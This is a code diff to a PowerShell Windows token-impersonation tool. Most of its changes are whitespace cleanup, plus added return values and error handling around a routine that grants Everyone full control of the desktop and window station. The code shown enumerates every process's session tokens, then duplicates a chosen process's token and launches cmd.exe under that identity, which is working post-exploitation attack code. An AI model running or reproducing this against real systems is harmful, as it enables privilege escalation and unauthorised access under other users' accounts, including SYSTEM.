@@ -802,7 +802,7 @@ function EnablePrivilege($Privilege)
 				bool retVal;
 				IntPtr TokenHandle = IntPtr.Zero;
 				retVal = OpenProcessToken(ProcHandle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref TokenHandle);
-				
+
 				TokPriv1Luid tp;
 				tp.Count = 1;
 				tp.Luid = 0;
@@ -1455,7 +1455,7 @@ function LoadTokensAPI
 				public Int16 AceCount;
 				public Int16 Sbz2;
 			}
-			
+
 			[StructLayout(LayoutKind.Sequential)]
 			public struct TRUSTEE
 			{
@@ -1465,7 +1465,7 @@ function LoadTokensAPI
 				public UInt32 TrusteeType;
 				public IntPtr ptstrName;
 			}
-			
+
 			[StructLayout(LayoutKind.Sequential)]
 			public struct EXPLICIT_ACCESS
 			{
@@ -1625,7 +1625,7 @@ function LoadTokensAPI
 				public UInt32 PrivilegeCount;
 				public LUID ModifiedId;
 			}
-			
+
 			[StructLayout(LayoutKind.Sequential)]
 			public struct LSA_UNICODE_STRING
 			{
@@ -1633,13 +1633,13 @@ function LoadTokensAPI
 				UInt16 MaximumLength;
 				IntPtr Buffer;
 			}
-			
+
 			[StructLayout(LayoutKind.Sequential)]
 			public struct LARGE_INTEGER
 			{
 				Int64 QuadPart;
 			}
-			
+
 			[StructLayout(LayoutKind.Sequential)]
 			public struct LSA_LAST_INTER_LOGON_INFO
 			{
@@ -1647,7 +1647,7 @@ function LoadTokensAPI
 				LARGE_INTEGER LastFailedLogon;
 				UInt32 FailedAttemptCountSinceLastSuccessfulLogon;
 			}
-			
+
 			[StructLayout(LayoutKind.Sequential)]
 			public struct SECURITY_LOGON_SESSION_DATA
 			{
@@ -1660,16 +1660,16 @@ function LoadTokensAPI
 				public UInt32 Session;
 				public IntPtr Sid;
 				public LARGE_INTEGER LoginTime;
-				public LSA_UNICODE_STRING LoginServer;			
+				public LSA_UNICODE_STRING LoginServer;
 				public LSA_UNICODE_STRING DnsDomainName;
 				public LSA_UNICODE_STRING Upn;
 				public UInt32 UserFlags;
 				public LSA_LAST_INTER_LOGON_INFO LastLogonInfo;
-				public LSA_UNICODE_STRING LogonScript;		
+				public LSA_UNICODE_STRING LogonScript;
 				public LSA_UNICODE_STRING ProfilePath;
 				public LSA_UNICODE_STRING HomeDirectory;
 				public LSA_UNICODE_STRING HomeDirectoryDrive;
-				public LARGE_INTEGER LogoffTime;				
+				public LARGE_INTEGER LogoffTime;
 				public LARGE_INTEGER KickOffTime;
 				public LARGE_INTEGER PasswordLastSet;
 				public LARGE_INTEGER PasswordCanChange;
@@ -1717,7 +1717,7 @@ function LoadTokensAPI
 			public static extern bool CreateWellKnownSid(uint WellKnownSidType, IntPtr DomainSid, IntPtr pSid, ref uint cbSid);
 			[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
 			public static extern uint SetEntriesInAclW(uint cCountOfExplicitEntries, ref EXPLICIT_ACCESS pListOfExplicitEntries, IntPtr OldAcl, ref IntPtr NewAcl);
-			
+
 			[DllImport("User32.dll")]
 			public static extern IntPtr OpenWindowStationW(IntPtr lpszWinSta, bool fInherit, uint dwDesiredAccess);
 			[DllImport("User32.dll")]
@@ -1727,7 +1727,7 @@ function LoadTokensAPI
 			public static extern uint GetLastError();
 			[DllImport("Kernel32.dll")]
 			public static extern IntPtr LocalFree(IntPtr hMem);
-			
+
 			[DllImport("Secur32.dll")]
 			public static extern uint LsaGetLogonSessionData(IntPtr LogonId, ref IntPtr ppLogonSessionData);
 		}
@@ -5464,7 +5464,7 @@ function Set-DesktopACLs
 	If (-not (EnablePrivilege "SeSecurityPrivilege"))
 	{
 		Write-Host ("[-] Failed to enable SeSecurityPrivilege`n")
-		return
+		return $False
 	}
 
 	# Change the privilege for the current window station to allow full privilege for all users
@@ -5477,7 +5477,7 @@ function Set-DesktopACLs
 		return $False
 	}
 
-	If (-not $(Set-DesktopACLToAllowEveryone $hWinsta)) { return }
+	If (-not $(Set-DesktopACLToAllowEveryone $hWinsta)) { return $False }
 	$Discard = [TokensAPI]::CloseHandle($hWinsta)
 
 	# Change the privilege for the current desktop to allow full privilege for all users
@@ -5488,8 +5488,9 @@ function Set-DesktopACLs
 		return $False
 	}
 
-	If (-not $(Set-DesktopACLToAllowEveryone $hDesktop)) { return }
+	If (-not $(Set-DesktopACLToAllowEveryone $hDesktop)) { return $False }
 	$Discard = [TokensAPI]::CloseHandle($hDesktop)
+	return $True
 }
 
 function Set-DesktopACLToAllowEveryone($hObject)
@@ -5570,14 +5571,14 @@ function Set-DesktopACLToAllowEveryone($hObject)
 		$Discard = [TokensAPI]::LocalFree($ppSecurityDescriptor)
 		return $True
 	}
-	
+
 	return $False
 }
 
 function ListSessionTokens
 {
 	Write-Host ("`n[===] Listing Session Tokens [===]")
-	
+
 	# Load Tokens functions
 	LoadTokensAPI
 
@@ -5611,9 +5612,9 @@ function ListSessionTokens
 		Write-Host ("[-] Failed to enumerate any process`n")
 		return
 	}
-	
+
 	Write-Host ("[+] Format = ProcessID:SessionID:Domain:UserName:SID:LogonID:TokenType:LogonType")
-	
+
 	# Open each process
 	For ($i = 0; $i -lt $NbProcesses; $i += 1)
 	{
@@ -5630,7 +5631,7 @@ function ListSessionTokens
 			{
 				# Get token information
 				$TokenInfoLength = 0
-				
+
 				### TokenUser: SIDPtr to string SID ###
 				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenUser, 0, $TokenInfoLength, [ref]$TokenInfoLength)
 				If (-not $Succeeded)
@@ -5722,7 +5723,7 @@ function ListSessionTokens
 					$Discard = [TokensAPI]::CloseHandle($TokenHandle)
 					Continue
 				}
-				
+
 				### Get LogonType ###
 				$LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type](New-Object TokensAPI+LUID).GetType()))
 				[System.Runtime.InteropServices.Marshal]::StructureToPtr($Cast.AuthenticationId, $LuidPtr, $False)
@@ -5743,12 +5744,12 @@ function ListSessionTokens
 					$LogonSessionData = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LogonSessionDataPtr, [Type](New-Object TokensAPI+SECURITY_LOGON_SESSION_DATA).GetType())
 					$LogonType = $LogonSessionData.LogonType
 				}
-				
+
 				$Discard = [TokensAPI]::CloseHandle($ProcHandle)
 				$Discard = [TokensAPI]::CloseHandle($TokenHandle)
 				$Discard = [TokensAPI]::CloseHandle($LuidPtr)
 				$Discard = [TokensAPI]::CloseHandle($LogonSessionDataPtr)
-				
+
 				# ProcessID:SessionID:Domain:UserName:SID:LogonID:TokenType:LogonType
 				Write-Host ("[+] {0}:{1}:{2}:{3}:{4}:{5}:{6}:{7}" -f ($ProcessIds[$i], $SessionID, $Domain, $UserName, $SID, $LogonID, $TokenType, $LogonType))
 			}
@@ -5765,10 +5766,10 @@ function ImpersonateToken($ProcID, $Method)
 		Write-Host ("`n[-] You must provide ProcID and Method parameters`n" -f ($SIDToImpersonate))
 		return
 	}
-	
-	Write-Host ("`n[+] Try to impersonate Session Token of process ID = {0}" -f ($ProcID))
+
+	Write-Host ("`n[+] Try to impersonate Session Token of process ID = {0}`n" -f ($ProcID))
 	$ProcFound = $False
-	
+
 	# Load Tokens functions
 	LoadTokensAPI
 
@@ -5810,7 +5811,7 @@ function ImpersonateToken($ProcID, $Method)
 				Write-Host ("[-] OpenProcess() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
 				return
 			}
-			
+
 			$TokenHandle = New-Object IntPtr
 			$Succeeded = [TokensAPI]::OpenProcessToken($ProcHandle, [TokensAPI]::TOKEN_DUPLICATE -bor [TokensAPI]::TOKEN_READ -bor [TokensAPI]::TOKEN_QUERY, [ref]$TokenHandle)
 			If (-not $Succeeded)
@@ -5819,7 +5820,7 @@ function ImpersonateToken($ProcID, $Method)
 				$Discard = [TokensAPI]::CloseHandle($ProcHandle)
 				return
 			}
-			
+
 			$DupToken = New-Object IntPtr
 			$lpTokenAttributes = New-Object TokensAPI+SECURITY_ATTRIBUTES
 			$Succeeded = [TokensAPI]::DuplicateTokenEx($TokenHandle, [TokensAPI]::TOKEN_ALL_ACCESS, [ref]$lpTokenAttributes, [TokensAPI+SECURITY_IMPERSONATION_LEVEL]::SecurityImpersonation, [TokensAPI+TOKEN_TYPE]::TokenPrimary, [ref]$DupToken)
@@ -5830,7 +5831,7 @@ function ImpersonateToken($ProcID, $Method)
 				$Discard = [TokensAPI]::CloseHandle($TokenHandle)
 				return
 			}
-			
+
 			If ($Method -eq "ImpersonateLoggedOnUser")
 			{
 				$Succeeded = [TokensAPI]::ImpersonateLoggedOnUser($DupToken)
@@ -5851,8 +5852,15 @@ function ImpersonateToken($ProcID, $Method)
 					# When impersonating another user than NT\SYSTEM, this user will not have full permission on the Window Station and Desktop objects and the GUI will be partially rendered
 					# Thus It is required to add an ACL to grant the "Everyone" group full control of the current Windows Station and Desktop
 					# https://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/
-					Set-DesktopACLs
-					
+					$Succeeded = Set-DesktopACLs
+					If (-not $Succeeded)
+					{
+						$Discard = [TokensAPI]::CloseHandle($ProcHandle)
+						$Discard = [TokensAPI]::CloseHandle($TokenHandle)
+						$Discard = [TokensAPI]::CloseHandle($DupToken)
+						return
+					}
+
 					$lpStartupInfo = New-Object TokensAPI+STARTUPINFO
 					$lpProcessInformation = New-Object TokensAPI+PROCESS_INFORMATION
 					$CmdLinePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("C:\\Windows\\System32\\cmd.exe")
@@ -5865,7 +5873,7 @@ function ImpersonateToken($ProcID, $Method)
 					{
 						Write-Host ("[+] Successfully impersonated token of requested process ID with CreateProcessWithTokenW()`n")
 					}
-					
+
 					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($CmdLinePtr)
 				}
 				ElseIf ($Method -eq "CreateProcessAsUser")
@@ -5880,7 +5888,7 @@ function ImpersonateToken($ProcID, $Method)
 						$Discard = [TokensAPI]::CloseHandle($DupToken)
 						return
 					}
-				
+
 					$lpStartupInfo = New-Object TokensAPI+STARTUPINFO
 					$lpProcessInformation = New-Object TokensAPI+PROCESS_INFORMATION
 					$CmdLinePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("C:\\Windows\\System32\\cmd.exe")
@@ -5895,7 +5903,7 @@ function ImpersonateToken($ProcID, $Method)
 						$SpawnProc = Get-CIMInstance -ClassName win32_process -filter "parentprocessid = '$($([System.Diagnostics.Process]::GetCurrentProcess().Id))'" | Select ProcessId
 						Wait-Process -Id $SpawnProc.ProcessId
 					}
-					
+
 					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($CmdLinePtr)
 				}
 				Else
@@ -5903,7 +5911,7 @@ function ImpersonateToken($ProcID, $Method)
 					Write-Host ("[-] Unknown method '{0}' to impersonate Session Tokens`n" -f ($Method))
 				}
 			}
-			
+
 			$Discard = [TokensAPI]::CloseHandle($ProcHandle)
 			$Discard = [TokensAPI]::CloseHandle($TokenHandle)
 			$Discard = [TokensAPI]::CloseHandle($DupToken)
